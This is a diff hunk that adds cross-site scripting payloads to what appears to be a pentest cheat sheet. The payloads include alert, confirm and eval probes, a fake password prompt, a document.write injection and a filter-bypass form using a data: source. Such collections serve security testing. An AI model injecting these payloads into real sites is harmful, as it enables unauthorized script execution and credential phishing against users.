@@ -882,7 +882,23 @@ Content-Type: application/x-php
 > payalod xss tosinks
 > xss common bypass alert()
 ```
+<script>
+confirm("This is a malicious alert");
+</script>
+
+<script>
+prompt("Enter your password:");
+</script>
+
+
+<script>
+document.write("<script>alert('This is a malicious alert');</script>");
+</script>
+
+
 <script>eval('alert("XSS")')</script>
+
+<script/src=data:,alert()>
 
 <script>Function('alert("XSS")')()</script>
 
